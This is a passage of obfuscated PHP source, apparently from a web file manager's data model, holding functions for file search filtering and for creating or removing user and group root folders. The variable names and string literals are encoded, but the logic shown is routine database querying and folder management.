$¬‰ü¾ìä = $Ò…ãŒı—[7]; if (!$ØÕ†ÏãÖ[$Ò…ãŒı—[166]]) { $£èÑ±›Ø = array_to_keyvalue($ôá™•ö°, $Ò…ãŒı—[12], $Ò…ãŒı—[166]); $İ€®²ÙÁ = implode($Ò…ãŒı—[50], $£èÑ±›Ø); $¬‰ü¾ìä = $Ò…ãŒı—[2402]; } $¢Åä×Ğ = explode($Ò…ãŒı—[50], trim($İ€®²ÙÁ, $Ò…ãŒı—[50])); return array($¬‰ü¾ìä, $¢Åä×Ğ); } public function listPathType($ıëŸ¹ºÛ) { $‘ıìÇª =& $_SERVER[”øäÃÍª]; $È¸Ş Ö = $this->fileTypeWhere($ıëŸ¹ºÛ); if (!$È¸Ş Ö) { return array(); } $ä÷íÀ = USER_ID; $­ñ³·Á = Model($‘ıìÇª[625])->getInfo($ä÷íÀ); $¬éõË§® = array($‘ıìÇª[678] => SourceModel::TYPE_USER, $‘ıìÇª[612] => array($‘ıìÇª[643], $‘ıìÇª[621] . $­ñ³·Á[$‘ıìÇª[90]][$‘ıìÇª[191]] . $‘ıìÇª[644]), $‘ıìÇª[679] => $ä÷íÀ, $‘ıìÇª[676] => 0, $‘ıìÇª[677] => $È¸Ş Ö); return $this->listSource($¬éõË§®); } public function listSearch($™îÑ†Àä, $Æ÷Ú÷ñÔ = 300) { $É´»áè =& $_SERVER[”øäÃÍª]; if (isset($™îÑ†Àä[$É´»áè[2236]]) && $™îÑ†Àä[$É´»áè[2236]]) { $™îÑ†Àä[$É´»áè[2236]] = str_replace($É´»áè[474], $É´»áè[2403], trim($™îÑ†Àä[$É´»áè[2236]])); } $¶ú¯Ìğæ = $this->_parseSearchWhere($™îÑ†Àä); if (!isset($¶ú¯Ìğæ[$É´»áè[528]])) { $¶ú¯Ìğæ[$É´»áè[528]] = 0; } $Š£¢Å…¬ = $É´»áè[2404]; $øã¨ï¾ˆ = $¶ú¯Ìğæ; $İ‚ıâª = $Š£¢Å…¬; $this->_listSearchBindPinyin($™îÑ†Àä, $¶ú¯Ìğæ, $Š£¢Å…¬); $this->alias($É´»áè[541])->_makeOrder(); $¶ú¯Ìğæ = $this->parseWhereLike($¶ú¯Ìğæ); $¥ÜŒÉ‘É = $this->distinct(!0)->field($Š£¢Å…¬)->where($¶ú¯Ìğæ)->selectPage($Æ÷Ú÷ñÔ); if ($GLOBALS[$É´»áè[6]][$É´»áè[468]][$É´»áè[469]] && Input::check($™îÑ†Àä[$É´»áè[2236]], $É´»áè[685]) && $¥ÜŒÉ‘É[$É´»áè[443]][$É´»áè[428]] == 1 && $¥ÜŒÉ‘É[$É´»áè[443]][$É´»áè[444]] == 0) { $¥ÜŒÉ‘É = $this->distinct(!0)->field($Š£¢Å…¬)->where($øã¨ï¾ˆ)->limit(1000)->select(); $¥ÜŒÉ‘É = array_page_split($¥ÜŒÉ‘É, !1, $Æ÷Ú÷ñÔ); } $this->_listSearchFileContent($¥ÜŒÉ‘É, $™îÑ†Àä, $İ‚ıâª, $øã¨ï¾ˆ); $this->_listSearchDesc($¥ÜŒÉ‘É, $™îÑ†Àä, $İ‚ıâª); $this->_listSearchTag($¥ÜŒÉ‘É, $™îÑ†Àä, $İ‚ıâª); $this->_listSearchGroupTag($¥ÜŒÉ‘É, $™îÑ†Àä, $İ‚ıâª); $this->_listDataApply($¥ÜŒÉ‘É[$É´»áè[446]]); $this->_listMake($¥ÜŒÉ‘É); return $¥ÜŒÉ‘É; } private function _listSearchFileContent(&$Ãôí¼İ…, $ßó±ªñÎ, $ê­ê³†, $¢ÑØ ÌÍ) { $Ó‚šê¬ =& $_SERVER[”øäÃÍª]; if (!$ßó±ªñÎ[$Ó‚šê¬[2236]] || $Ãôí¼İ…[$Ó‚šê¬[443]][$Ó‚šê¬[428]] > 1) { return; } if (!isset($¢ÑØ ÌÍ[$Ó‚šê¬[32]]) || !is_array($ßó±ªñÎ[$Ó‚šê¬[565]]) || !$ßó±ªñÎ[$Ó‚šê¬[565]]) { return; } $¢ÑØ ÌÍ[$Ó‚šê¬[565]] = array($Ó‚šê¬[7], $ßó±ªñÎ[$Ó‚šê¬[565]]); unset($¢ÑØ ÌÍ[$Ó‚šê¬[32]]); unset($ßó±ªñÎ[$Ó‚šê¬[565]]); $ª¾Û£¿ì = $this->field($ê­ê³†)->where($¢ÑØ ÌÍ)->limit($Ó‚šê¬[2405])->select(); $ª¾Û£¿ì = array_to_keyvalue($ª¾Û£¿ì, $Ó‚šê¬[191], $Ó‚šê¬[12]); $ÇŠ“–’ı = array_to_keyvalue($Ãôí¼İ…[$Ó‚šê¬[446]], $Ó‚šê¬[191], $Ó‚šê¬[12]); $í°°‡å÷ = array(); foreach ($ª¾Û£¿ì as $—Íèü£Ï => $‘şÑÎ“™) { if (!$ÇŠ“–’ı[$—Íèü£Ï]) { $í°°‡å÷[] = $‘şÑÎ“™; } } if (!$í°°‡å÷) { return; } $Ãôí¼İ…[$Ó‚šê¬[446]] = array_merge($í°°‡å÷, $Ãôí¼İ…[$Ó‚šê¬[446]]); $Ãôí¼İ…[$Ó‚šê¬[443]][$Ó‚šê¬[444]] += count($í°°‡å÷); } private function _listSearchTag(&$Ô„ È‰ş, $ŠË¸£í½, $—úâÄ€‚) { $¹šàğ·é =& $_SERVER[”øäÃÍª]; if (empty($ŠË¸£í½[$¹šàğ·é[2102]]) || !in_array($¹šàğ·é[2406], $ŠË¸£í½[$¹šàğ·é[2102]])) { return; } if (!$ŠË¸£í½[$¹šàğ·é[2236]] || $Ô„ È‰ş[$¹šàğ·é[443]][$¹šàğ·é[428]] > 1) { return; } $˜±Ûúº« = Model($¹šàğ·é[2407])->listData(); $¥Ûòİø¬ = array(); $·²œš«è = $ŠË¸£í½[$¹šàğ·é[2236]]; foreach ($˜±Ûúº« as $¾İÜ¬‹«) { $ëñ³Åê¤ = $¾İÜ¬‹«[$¹šàğ·é[32]]; $×½«µ´¨ = str_replace($¹šàğ·é[53], $¹šàğ·é[12], Pinyin::get($ëñ³Åê¤)); if (stripos($ëñ³Åê¤, $·²œš«è) !== !1 || stripos($×½«µ´¨, $·²œš«è) !== !1) { $¥Ûòİø¬[] = $¾İÜ¬‹«[$¹šàğ·é[487]]; } } if (!$¥Ûòİø¬) { return; } $İ´—ïÊß = array($¹šàğ·é[523] => array($¹šàğ·é[7], $¥Ûòİø¬), $¹šàğ·é[1548] => USER_ID); $ŠÄ–Ó¡Ï = Model($¹šàğ·é[525])->field($¹šàğ·é[87])->where($İ´—ïÊß)->select(); $ŠÄ–Ó¡Ï = array_to_keyvalue($ŠÄ–Ó¡Ï, $¹šàğ·é[12], $¹šàğ·é[87]); $Ó¹½›ä = array_unique($ŠÄ–Ó¡Ï); $this->_listSearchMerge($Ô„ È‰ş, $ŠË¸£í½, $—úâÄ€‚, $Ó¹½›ä); } private function _listSearchDesc(&$ø½êœÌè, $æ›§¦ÙÉ, $„ïªÊÄº) { $íéÛêˆÅ =& $_SERVER[”øäÃÍª]; if (empty($æ›§¦ÙÉ[$íéÛêˆÅ[2102]]) || !in_array($íéÛêˆÅ[548], $æ›§¦ÙÉ[$íéÛêˆÅ[2102]])) { return; } if (!$æ›§¦ÙÉ[$íéÛêˆÅ[2236]] || $ø½êœÌè[$íéÛêˆÅ[443]][$íéÛêˆÅ[428]] > 1) { return; } $“—ã­ã = array($íéÛêˆÅ[95] => $íéÛêˆÅ[548], $íéÛêˆÅ[451] => array($íéÛêˆÅ[473], $íéÛêˆÅ[2238] . $æ›§¦ÙÉ[$íéÛêˆÅ[2236]] . $íéÛêˆÅ[2238])); $•À˜‹½å = !1; if ($•À˜‹½å) { $Ñ§¢ˆŞİ = $this->listSearchChildren($æ›§¦ÙÉ[$íéÛêˆÅ[190]]); $Ñ§¢ˆŞİ = array_unique($Ñ§¢ˆŞİ); if (!$Ñ§¢ˆŞİ) { return; } $“—ã­ã[$íéÛêˆÅ[191]] = array($íéÛêˆÅ[7], $Ñ§¢ˆŞİ); } $»ùëÔÍ’ = Model($íéÛêˆÅ[471])->field($íéÛêˆÅ[191])->where($“—ã­ã)->limit(5000)->select(); $÷¸ì¹¦ï = array_to_keyvalue($»ùëÔÍ’, $íéÛêˆÅ[12], $íéÛêˆÅ[191]); $this->_listSearchMerge($ø½êœÌè, $æ›§¦ÙÉ, $„ïªÊÄº, $÷¸ì¹¦ï); } private function _listSearchGroupTag(&$Ÿ©¹š›÷, $„ˆôİ‘, $áş¤ŒÈÒ) { $´öÕú­æ =& $_SERVER[”øäÃÍª]; if (empty($„ˆôİ‘[$´öÕú­æ[2102]]) || !in_array($´öÕú­æ[2406], $„ˆôİ‘[$´öÕú­æ[2102]])) { return; } if (!$„ˆôİ‘[$´öÕú­æ[2236]] || $Ÿ©¹š›÷[$´öÕú­æ[443]][$´öÕú­æ[428]] > 1 || !$„ˆôİ‘[$´öÕú­æ[190]]) { return; } $æ°ÅÚ– = $this->sourceInfo($„ˆôİ‘[$´öÕú­æ[190]]); if (!$æ°ÅÚ– || $æ°ÅÚ–[$´öÕú­æ[188]] != SourceModel::TYPE_GROUP) { return; } $£²Í¶ = $æ°ÅÚ–[$´öÕú­æ[597]]; $Š¥öİ¼ = Model($´öÕú­æ[2408])->get($£²Í¶); $¿â•Â¢¢ = array(); $½şşÑŸ² = $„ˆôİ‘[$´öÕú­æ[2236]]; foreach ($Š¥öİ¼[$´öÕú­æ[446]] as $Ó‹ÓÖÄ) { $ã‹¦¡œğ = $Ó‹ÓÖÄ[$´öÕú­æ[32]]; $’Ôåµø¡ = str_replace($´öÕú­æ[53], $´öÕú­æ[12], Pinyin::get($ã‹¦¡œğ)); if (stripos($ã‹¦¡œğ, $½şşÑŸ²) !== !1 || stripos($’Ôåµø¡, $½şşÑŸ²) !== !1) { $¿â•Â¢¢[] = $Ó‹ÓÖÄ[$´öÕú­æ[487]]; } } if (!$¿â•Â¢¢) { return; } $¬œ¾¹ÌĞ = array($´öÕú­æ[523] => array($´öÕú­æ[7], $¿â•Â¢¢), $´öÕú­æ[1548] => 0, $´öÕú­æ[33] => $´öÕú­æ[1446] . $£²Í¶); $İê¼±‡… = Model($´öÕú­æ[525])->field($´öÕú­æ[87])->where($¬œ¾¹ÌĞ)->select(); $İê¼±‡… = array_to_keyvalue($İê¼±‡…, $´öÕú­æ[12], $´öÕú­æ[87]); $Ë„Ø  = array_unique($İê¼±‡…); $this->_listSearchMerge($Ÿ©¹š›÷, $„ˆôİ‘, $áş¤ŒÈÒ, $Ë„Ø ); } private function _listSearchMerge(&$¯¨–æßµ, $ÅÈÈÂ‡„, $ˆû­¨¸Î, $Ÿ›×È¦İ) { $¥ Š¯½ğ =& $_SERVER[”øäÃÍª]; if (!$Ÿ›×È¦İ) { return; } $ŠÎ¬ÚĞ = array_to_keyvalue($¯¨–æßµ[$¥ Š¯½ğ[446]], $¥ Š¯½ğ[12], $¥ Š¯½ğ[191]); $æ®¥ó… = array_diff($Ÿ›×È¦İ, $ŠÎ¬ÚĞ); if (!$æ®¥ó…) { return; } $‡êˆÁÚ¸ = array($¥ Š¯½ğ[191] => array($¥ Š¯½ğ[7], $æ®¥ó…)); $š‡Åğ‘ù = $this->field($ˆû­¨¸Î)->where($‡êˆÁÚ¸)->select(); if (!$š‡Åğ‘ù) { return; } $ˆŞşß•ß = array(); foreach ($š‡Åğ‘ù as $Ì„ˆæƒù) { if ($this->_listSearchFilter($Ì„ˆæƒù, $ÅÈÈÂ‡„)) { $ˆŞşß•ß[] = $Ì„ˆæƒù; } } $¯¨–æßµ[$¥ Š¯½ğ[446]] = array_merge($ˆŞşß•ß, $¯¨–æßµ[$¥ Š¯½ğ[446]]); $¯¨–æßµ[$¥ Š¯½ğ[443]][$¥ Š¯½ğ[444]] += count($ˆŞşß•ß); } private function _listSearchFilter($ôã ´ñ¼, $µ‹Ì‡) { $»Ñ ¬®„ =& $_SERVER[”øäÃÍª]; $´ªÚÇ¬­ = $ôã ´ñ¼[$»Ñ ¬®„[508]] == $»Ñ ¬®„[91]; if (!strstr($ôã ´ñ¼[$»Ñ ¬®„[612]], $»Ñ ¬®„[50] . $µ‹Ì‡[$»Ñ ¬®„[190]] . $»Ñ ¬®„[50])) { return !1; } if (isset($µ‹Ì‡[$»Ñ ¬®„[509]]) && $µ‹Ì‡[$»Ñ ¬®„[509]] != $»Ñ ¬®„[888]) { if ($µ‹Ì‡[$»Ñ ¬®„[509]] == $»Ñ ¬®„[78] && !$´ªÚÇ¬­) { return !1; } if ($µ‹Ì‡[$»Ñ ¬®„[509]] != $»Ñ ¬®„[78] && $´ªÚÇ¬­) { return !1; } if (!strstr($ôã ´ñ¼[$»Ñ ¬®„[166]], $»Ñ ¬®„[50] . $µ‹Ì‡[$»Ñ ¬®„[509]] . $»Ñ ¬®„[50])) { return !1; } } if (isset($µ‹Ì‡[$»Ñ ¬®„[2409]]) && $µ‹Ì‡[$»Ñ ¬®„[2409]] < $ôã ´ñ¼[$»Ñ ¬®„[79]]) { return !1; } if (isset($µ‹Ì‡[$»Ñ ¬®„[2410]]) && $µ‹Ì‡[$»Ñ ¬®„[2410]] > $ôã ´ñ¼[$»Ñ ¬®„[79]]) { return !1; } if (isset($µ‹Ì‡[$»Ñ ¬®„[692]]) && $µ‹Ì‡[$»Ñ ¬®„[692]] != $ôã ´ñ¼[$»Ñ ¬®„[551]]) { return !1; } return !0; } public function listSearchChildren($ÕæÁ´æ, $í‰Ö½Âõ = 5000) { $¬™ïÜ‰ =& $_SERVER[”øäÃÍª]; $ò©¯–ó = array(); $óö×ºğë = $this->sourceInfo($ÕæÁ´æ); $³“•¯š¯ = array($¬™ïÜ‰[612] => array($¬™ïÜ‰[473], $óö×ºğë[$¬™ïÜ‰[612]] . $óö×ºğë[$¬™ïÜ‰[191]] . $¬™ïÜ‰[644])); $“Û“…à = $this->field($¬™ïÜ‰[79])->where($³“•¯š¯)->limit($í‰Ö½Âõ + 1)->select(); $Ø›Î¯„ô = is_array($“Û“…à) ? count($“Û“…à) : 0; if ($Ø›Î¯„ô > $í‰Ö½Âõ) { return $this->_listSearchChildrenNear($ÕæÁ´æ, $í‰Ö½Âõ); } $ŠÓ±¬ = $this->field($¬™ïÜ‰[191])->where($³“•¯š¯)->select(); $ò©¯–ó = array_to_keyvalue($ŠÓ±¬, $¬™ïÜ‰[12], $¬™ïÜ‰[191]); return $ò©¯–ó; } private function _listSearchChildrenNear($À½î£À, $üåÃ¤ø€) { $¸€µßÄà =& $_SERVER[”øäÃÍª]; $áê³î‰› = array(); $äİ² = array($¸€µßÄà[190] => $À½î£À); $ò‹ú×Ä– = $this->field($¸€µßÄà[2411])->where($äİ²)->select(); $£ñƒÙ¸Œ = array_to_keyvalue(array_filter_by_field($ò‹ú×Ä–, $¸€µßÄà[508], $¸€µßÄà[91]), $¸€µßÄà[12], $¸€µßÄà[191]); $áê³î‰› = array_merge($áê³î‰›, array_to_keyvalue($ò‹ú×Ä–, $¸€µßÄà[12], $¸€µßÄà[191])); if (!$£ñƒÙ¸Œ) { return $áê³î‰›; } $äİ² = array($¸€µßÄà[190] => array($¸€µßÄà[7], $£ñƒÙ¸Œ)); $ò‹ú×Ä– = $this->field($¸€µßÄà[2411])->where($äİ²)->limit($üåÃ¤ø€)->select(); $áê³î‰› = array_merge($áê³î‰›, array_to_keyvalue($ò‹ú×Ä–, $¸€µßÄà[12], $¸€µßÄà[191])); $áê³î‰› = array_slice($áê³î‰›, 0, intval($üåÃ¤ø€)); return $áê³î‰›; } private function _listSearchBindPinyin($¨Ï£ÃÃß, &$‹¨©ÚÓ, &$Æáàè‹) { $åÆÖ–Ã” =& $_SERVER[”øäÃÍª]; if (!isset($¨Ï£ÃÃß[$åÆÖ–Ã”[2236]]) || !$¨Ï£ÃÃß[$åÆÖ–Ã”[2236]]) { return; } if (!Input::check($¨Ï£ÃÃß[$åÆÖ–Ã”[2236]], $åÆÖ–Ã”[393]) || strlen($¨Ï£ÃÃß[$åÆÖ–Ã”[2236]]) < 2) { return; } $µ»ç’éŒ = "\114\105\x46\124\40\112\x4f\x49\116\40{$this->tablePrefix}\151\157\x5f\x73\x6f\165\162\143\x65\x5f\155\145\164\x61\40\155\x65\x74\x61\40\x6f\156\x20\x73\157\165\162\x63\145\56\x73\x6f\x75\162\143\145\111\104\40\75\40\x6d\x65\x74\141\56\x73\157\165\162\143\x65\111\104"; $Çİ„ºß¤ = array(); $Æáàè‹ = str_replace(array($åÆÖ–Ã”[285], $åÆÖ–Ã”[53], $åÆÖ–Ã”[2412]), $åÆÖ–Ã”[12], $Æáàè‹); $Æáàè‹ = $åÆÖ–Ã”[533] . str_replace($åÆÖ–Ã”[50], $åÆÖ–Ã”[534], $Æáàè‹); $¯é›Ô—¬ = $‹¨©ÚÓ[$åÆÖ–Ã”[32]]; unset($‹¨©ÚÓ[$åÆÖ–Ã”[32]]); foreach ($‹¨©ÚÓ as $ ³İ‡·² => $§õ£ü) { $Çİ„ºß¤[$åÆÖ–Ã”[533] . $ ³İ‡·²] = $§õ£ü; } foreach ($¯é›Ô—¬ as $ñ„º³İ—) { $Çİ„ºß¤[] = array($åÆÖ–Ã”[538] => $ñ„º³İ—, $åÆÖ–Ã”[1122] => $åÆÖ–Ã”[2240], array($åÆÖ–Ã”[2413] => $ñ„º³İ—, $åÆÖ–Ã”[2414] => array($åÆÖ–Ã”[7], array($åÆÖ–Ã”[560], $åÆÖ–Ã”[559])))); } $this->join($µ»ç’éŒ); $‹¨©ÚÓ = $Çİ„ºß¤; } private function _parseSearchWhere($Ÿ•ğ—œı) { $§ÚŞ¡§ =& $_SERVER[”øäÃÍª]; $Ğ½¤È½Ë = array(); if (isset($Ÿ•ğ—œı[$§ÚŞ¡§[870]]) && $Ÿ•ğ—œı[$§ÚŞ¡§[870]]) { $Ğ½¤È½Ë[$§ÚŞ¡§[88]] = array($§ÚŞ¡§[2415], $Ÿ•ğ—œı[$§ÚŞ¡§[870]]); } if (isset($Ÿ•ğ—œı[$§ÚŞ¡§[871]]) && $Ÿ•ğ—œı[$§ÚŞ¡§[871]]) { $…÷¹‰Ûü = array($§ÚŞ¡§[2416], $Ÿ•ğ—œı[$§ÚŞ¡§[871]]); if ($Ğ½¤È½Ë[$§ÚŞ¡§[88]]) { $Ğ½¤È½Ë[$§ÚŞ¡§[88]] = array($Ğ½¤È½Ë[$§ÚŞ¡§[88]], $…÷¹‰Ûü, $§ÚŞ¡§[2417]); } else { $Ğ½¤È½Ë[$§ÚŞ¡§[88]] = $…÷¹‰Ûü; } } if (isset($Ÿ•ğ—œı[$§ÚŞ¡§[2409]]) && $Ÿ•ğ—œı[$§ÚŞ¡§[2409]] > 0) { $Ğ½¤È½Ë[$§ÚŞ¡§[79]] = array($§ÚŞ¡§[2415], $Ÿ•ğ—œı[$§ÚŞ¡§[2409]]); } if (isset($Ÿ•ğ—œı[$§ÚŞ¡§[2410]]) && $Ÿ•ğ—œı[$§ÚŞ¡§[2410]]) { $…÷¹‰Ûü = array($§ÚŞ¡§[2416], $Ÿ•ğ—œı[$§ÚŞ¡§[2410]]); if ($Ğ½¤È½Ë[$§ÚŞ¡§[79]]) { $Ğ½¤È½Ë[$§ÚŞ¡§[79]] = array($Ğ½¤È½Ë[$§ÚŞ¡§[79]], $…÷¹‰Ûü, $§ÚŞ¡§[2417]); } else { $Ğ½¤È½Ë[$§ÚŞ¡§[79]] = $…÷¹‰Ûü; } } if (isset($Ÿ•ğ—œı[$§ÚŞ¡§[692]]) && $Ÿ•ğ—œı[$§ÚŞ¡§[692]]) { $Ğ½¤È½Ë[] = array($§ÚŞ¡§[551] => $Ÿ•ğ—œı[$§ÚŞ¡§[692]], $§ÚŞ¡§[549] => $Ÿ•ğ—œı[$§ÚŞ¡§[692]], $§ÚŞ¡§[1122] => $§ÚŞ¡§[2240]); } if (isset($Ÿ•ğ—œı[$§ÚŞ¡§[509]]) && $Ÿ•ğ—œı[$§ÚŞ¡§[509]]) { $ÁˆÏèï = $Ÿ•ğ—œı[$§ÚŞ¡§[509]]; if ($ÁˆÏèï == $§ÚŞ¡§[78]) { $Ğ½¤È½Ë[$§ÚŞ¡§[508]] = 1; } else { if ($ÁˆÏèï == $§ÚŞ¡§[2418]) { $Ğ½¤È½Ë[$§ÚŞ¡§[508]] = 0; } else { if ($ÁˆÏèï) { $ÁˆÏèï = is_array($ÁˆÏèï) ? $ÁˆÏèï : explode($§ÚŞ¡§[50], $ÁˆÏèï); $Ğ½¤È½Ë[$§ÚŞ¡§[509]] = array($§ÚŞ¡§[515], $ÁˆÏèï); $Ğ½¤È½Ë[$§ÚŞ¡§[508]] = 0; } } } } $this->_parseSearchParent($Ÿ•ğ—œı, $Ğ½¤È½Ë); if (isset($Ÿ•ğ—œı[$§ÚŞ¡§[2236]]) && trim($Ÿ•ğ—œı[$§ÚŞ¡§[2236]])) { $€‚Â­® = trim($Ÿ•ğ—œı[$§ÚŞ¡§[2236]]); $ì–Ø®Ÿ = explode($§ÚŞ¡§[53], $€‚Â­®); if (strlen($€‚Â­®) > 2 && (substr($€‚Â­®, 0, 1) == $§ÚŞ¡§[118] && substr($€‚Â­®, -1) == $§ÚŞ¡§[118]) || substr($€‚Â­®, 0, 1) == $§ÚŞ¡§[58] && substr($€‚Â­®, -1) == $§ÚŞ¡§[58]) { $€‚Â­® = substr($€‚Â­®, 1, -1); $ì–Ø®Ÿ = array($€‚Â­®); } $Ğ½¤È½Ë[$§ÚŞ¡§[32]] = array(array($§ÚŞ¡§[643], $§ÚŞ¡§[2238] . $€‚Â­® . $§ÚŞ¡§[2238])); if (count($ì–Ø®Ÿ) > 1) { $Ğ½¤È½Ë[$§ÚŞ¡§[32]] = array(); foreach ($ì–Ø®Ÿ as $ÌÕµ—ıÔ) { if (!trim($ÌÕµ—ıÔ)) { continue; } $Ğ½¤È½Ë[$§ÚŞ¡§[32]][] = array($§ÚŞ¡§[643], $§ÚŞ¡§[2238] . trim($ÌÕµ—ıÔ) . $§ÚŞ¡§[2238]); } } } return $Ğ½¤È½Ë; } private function _parseSearchParent($Ã­€õ¡â, &$«Ùôíª”) { $ñ¦é®à =& $_SERVER[”øäÃÍª]; if (!isset($Ã­€õ¡â[$ñ¦é®à[190]]) || !$Ã­€õ¡â[$ñ¦é®à[190]]) { return; } $’áŸ“¡Ÿ = $this->pathInfo($Ã­€õ¡â[$ñ¦é®à[190]]); $¼ï§Ù³ò = $’áŸ“¡Ÿ[$ñ¦é®à[190]] . $ñ¦é®à[12] === $ñ¦é®à[228]; $¦‰¼ßşä = $’áŸ“¡Ÿ[$ñ¦é®à[188]] == $ñ¦é®à[606]; if ($’áŸ“¡Ÿ[$ñ¦é®à[622]] == $ñ¦é®à[623]) { $®›²å‰ = $this->sourceInfo($Ã­€õ¡â[$ñ¦é®à[190]]); $’áŸ“¡Ÿ[$ñ¦é®à[612]] = $®›²å‰[$ñ¦é®à[612]]; } $«Ùôíª”[$ñ¦é®à[682]] = array($ñ¦é®à[643], $’áŸ“¡Ÿ[$ñ¦é®à[612]] . $Ã­€õ¡â[$ñ¦é®à[190]] . $ñ¦é®à[644]); $Éô€åêå = isset($Ã­€õ¡â[$ñ¦é®à[2102]]) && in_array($ñ¦é®à[606], $Ã­€õ¡â[$ñ¦é®à[2102]]); if (!$Éô€åêå || !$¦‰¼ßşä || !$¼ï§Ù³ò || !$’áŸ“¡Ÿ[$ñ¦é®à[510]]) { return; } if (!AuthModel::authCheckRoot($’áŸ“¡Ÿ[$ñ¦é®à[510]][$ñ¦é®à[511]])) { return; } $‘¼ß©İ = $’áŸ“¡Ÿ[$ñ¦é®à[597]] . $ñ¦é®à[12]; if ($‘¼ß©İ == $ñ¦é®à[91]) { unset($«Ùôíª”[$ñ¦é®à[682]]); $«Ùôíª”[$ñ¦é®à[188]] = self::TYPE_GROUP; return; } $”ã£³— = Model($ñ¦é®à[613])->groupChildrenAll($‘¼ß©İ); $­ˆ¹§µÒ = count($”ã£³—); if ($­ˆ¹§µÒ <= 1) { return; } $Š…”“‘¾ = array($ñ¦é®à[190] => 0, $ñ¦é®à[188] => self::TYPE_GROUP, $ñ¦é®à[597] => array($ñ¦é®à[7], $”ã£³—)); $˜ÜÂ÷¼ = $this->field($ñ¦é®à[2419])->where($Š…”“‘¾)->limit($­ˆ¹§µÒ)->select(); $«Ùôíª”[$ñ¦é®à[682]] = array(); foreach ($˜ÜÂ÷¼ as $ô½€“¾) { $«Ùôíª”[$ñ¦é®à[682]][] = array($ñ¦é®à[643], $ñ¦é®à[621] . $ô½€“¾[$ñ¦é®à[191]] . $ñ¦é®à[644]); } $«Ùôíª”[$ñ¦é®à[682]][] = $ñ¦é®à[2240]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ôÕ‰åıî) { $Çİ‚äøé =& $_SERVER[”øäÃÍª]; $¹ë±‰àÅ = Model($Çİ‚äøé[605])->where(array($Çİ‚äøé[1925] => $ôÕ‰åıî))->find(); $á“‹†â‚ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ôÕ‰åıî, $¹ë±‰àÅ[$Çİ‚äøé[32]]); $this->userDesktopAdd($á“‹†â‚); return $á“‹†â‚; } public function userDesktopAdd($ÆÄÔÛ°ö) { $ÓÛÀ°ÛÒ =& $_SERVER[”øäÃÍª]; $¤Õ§¯¹Ç = LNG($ÓÛÀ°ÛÒ[2420]); $Á¨’¥’Ë = $this->mkdir($ÆÄÔÛ°ö, $¤Õ§¯¹Ç); $this->metaSet($Á¨’¥’Ë, $ÓÛÀ°ÛÒ[2421], $ÓÛÀ°ÛÒ[91]); $this->metaSet($ÆÄÔÛ°ö, $ÓÛÀ°ÛÒ[2422], $Á¨’¥’Ë); } public function userPathSafeAdd($·ú«Ù´“) { $Š¾÷ËÉı =& $_SERVER[”øäÃÍª]; $ªÄªòû“ = Model($Š¾÷ËÉı[605])->getInfoFull($·ú«Ù´“); if (!$ªÄªòû“) { return !1; } if (_get($ªÄªòû“, $Š¾÷ËÉı[626])) { return $ªÄªòû“[$Š¾÷ËÉı[563]][$Š¾÷ËÉı[2423]]; } $×¿İ¨‘Ö = $this->_mkdirRoot(SourceModel::TYPE_USER, $·ú«Ù´“, $Š¾÷ËÉı[2424], $Š¾÷ËÉı[2425]); Model($Š¾÷ËÉı[605])->metaSet($·ú«Ù´“, $Š¾÷ËÉı[2423], $×¿İ¨‘Ö); $this->metaSet($×¿İ¨‘Ö, $Š¾÷ËÉı[2426], $·ú«Ù´“); return $×¿İ¨‘Ö; } public function userPathAppAdd($é…î¾Ã¤, $Øæ¾š†» = '', $€ØÆ‚¡˜ = '') { $™èÊËë =& $_SERVER[”øäÃÍª]; $‰äÙÎğŸ = Model($™èÊËë[605])->getInfoFull($é…î¾Ã¤); if (!$‰äÙÎğŸ) { return !1; } $ª»ó¶¤ = $‰äÙÎğŸ[$™èÊËë[563]] ? $‰äÙÎğŸ[$™èÊËë[563]] : array(); $ĞÅªŒ‚Ï = $ª»ó¶¤[$™èÊËë[2427]]; if (!$ĞÅªŒ‚Ï) { $ĞÅªŒ‚Ï = $this->_mkdirRoot(SourceModel::TYPE_USER, $é…î¾Ã¤, $™èÊËë[2428], $™èÊËë[2429]); Model($™èÊËë[605])->metaSet($é…î¾Ã¤, $™èÊËë[2427], $ĞÅªŒ‚Ï . $™èÊËë[12]); $this->metaSet($ĞÅªŒ‚Ï, $™èÊËë[2427], $é…î¾Ã¤); } if (!$Øæ¾š†») { return $ĞÅªŒ‚Ï; } $¥Çƒ¾ğ‡ = $ª»ó¶¤[$™èÊËë[2430] . $Øæ¾š†»]; if (!$¥Çƒ¾ğ‡) { $¥Çƒ¾ğ‡ = $this->mkdir($ĞÅªŒ‚Ï, $Øæ¾š†»); Model($™èÊËë[605])->metaSet($é…î¾Ã¤, $™èÊËë[2430] . $Øæ¾š†», $¥Çƒ¾ğ‡); $this->metaSet($¥Çƒ¾ğ‡, $™èÊËë[2430] . $Øæ¾š†», $é…î¾Ã¤); } if (!$€ØÆ‚¡˜) { return $¥Çƒ¾ğ‡; } $Ù °Øİõ = $this->mkdir($¥Çƒ¾ğ‡, $€ØÆ‚¡˜); return $Ù °Øİõ; } public function groupRootAdd($»”‡—éô) { $ê ĞÖíŞ =& $_SERVER[”øäÃÍª]; $¤Ô×—±å = Model($ê ĞÖíŞ[613])->where(array($ê ĞÖíŞ[2225] => $»”‡—éô))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $»”‡—éô, $¤Ô×—±å[$ê ĞÖíŞ[32]]); } public function systemRootPathAdd($²ÓêçóÜ) { if ($²ÓêçóÜ != $_SERVER[”øäÃÍª][636]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $²ÓêçóÜ); } public function userRootRemove($³„íöòˆ) { $¨Õñ‹Úé = $this->targetSourceRoot(SourceModel::TYPE_USER, $³„íöòˆ, !0); foreach ($¨Õñ‹Úé as $ÉÀ¹ÊºÌ) { if (!$ÉÀ¹ÊºÌ) { continue; } $this->remove($ÉÀ¹ÊºÌ[$_SERVER[”øäÃÍª][191]], !1); } } public function groupRootRemove($²€¤¤í) { $Äí²ûÚ¾ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $²€¤¤í); if (!$Äí²ûÚ¾) { return; } $this->remove($Äí²ûÚ¾[$_SERVER[”øäÃÍª][191]], !1); } private function _mkdirRoot($Î‹Ñö , $Şá˜Ğß, $²€ÉºÑß, $¥—¿Ò¿ü = '') { $¼¸‘¢¢ =& $_SERVER[”øäÃÍª]; $¸ä‹Üâ = KodUser::id(); $ÌÁÕØ = array($¼¸‘¢¢[500] => 0, $¼¸‘¢¢[678] => $Î‹Ñö , $¼¸‘¢¢[679] => 